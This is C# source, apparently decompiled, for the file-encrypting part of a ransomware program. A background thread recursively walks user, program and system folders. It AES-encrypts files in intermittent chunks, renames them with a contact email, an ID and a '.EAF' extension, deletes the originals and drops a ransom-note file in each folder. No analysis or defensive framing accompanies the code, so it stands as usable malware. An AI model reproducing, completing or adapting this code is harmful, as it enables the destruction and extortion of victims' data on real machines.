using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Fast;

internal class ENC2
{
	private static string EncryptPassword = Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D;

	public static void Start()
	{
		new Thread((ThreadStart)delegate
		{
			LookForDirectories();
		}).Start();
	}

	private static void LookForDirectories()
	{
		try
		{
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.NetworkShortcuts));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.PrinterShortcuts));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonAdminTools));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonOemLinks));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonTemplates));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		}
		catch
		{
		}
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(Program.validExtensions, (string E) => E != extension.ToLower()) && extension != ".EAF" && fileName != Program.droppedMessageTextbox && fileName != Program.processURL)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						fileInfo.Attributes = FileAttributes.Normal;
						EnceyptFile(files[i]);
						File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void EnceyptFile(string file)
	{
		try
		{
			string extension = Path.GetExtension(file);
			if (!(extension != ".EAF"))
			{
				return;
			}
			string encryptPassword = EncryptPassword;
			string fileName = Path.GetFileName(file);
			string directoryName = Path.GetDirectoryName(file);
			string text = directoryName + "\\[" + Program.email1 + "][" + Program.UniqueID() + "]" + fileName + ".EAF";
			if (!Encrypt(file, text, encryptPassword) && extension != ".EAF")
			{
				try
				{
					File.Move(file, text);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private static bool Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
	{
		try
		{
			using (FileStream fileStream = new FileStream(inputFilePath, FileMode.Open))
			{
				using (FileStream fileStream2 = new FileStream(outputfilePath, FileMode.Create))
				{
					fileStream.Position = 0L;
					using (Aes aes = Aes.Create())
					{
						byte[] salt = new byte[13]
						{
							73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
							100, 101, 118
						};
						using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, salt);
						aes.Mode = CipherMode.CBC;
						aes.Padding = PaddingMode.PKCS7;
						aes.Key = rfc2898DeriveBytes.GetBytes(32);
						aes.IV = rfc2898DeriveBytes.GetBytes(16);
						using CryptoStream cryptoStream = new CryptoStream(fileStream2, aes.CreateEncryptor(), CryptoStreamMode.Write);
						int num = 4096;
						byte[] buffer = new byte[num];
						int num2 = 0;
						int num3;
						do
						{
							num3 = fileStream.Read(buffer, 0, num);
							if (num2 <= 400000)
							{
								cryptoStream.Write(buffer, 0, num3);
							}
							else if (num2 >= 800000 && num2 <= 1200000)
							{
								cryptoStream.Write(buffer, 0, num3);
							}
							else if (num2 >= 1600000 && num2 <= 2000000)
							{
								cryptoStream.Write(buffer, 0, num3);
							}
							else
							{
								fileStream2.Write(buffer, 0, num3);
							}
							num2 += num3;
						}
						while (num3 != 0);
						cryptoStream.Close();
					}
					fileStream2.Close();
				}
				fileStream.Close();
			}
			File.Delete(inputFilePath);
			return true;
		}
		catch (SystemException)
		{
			return false;
		}
	}
}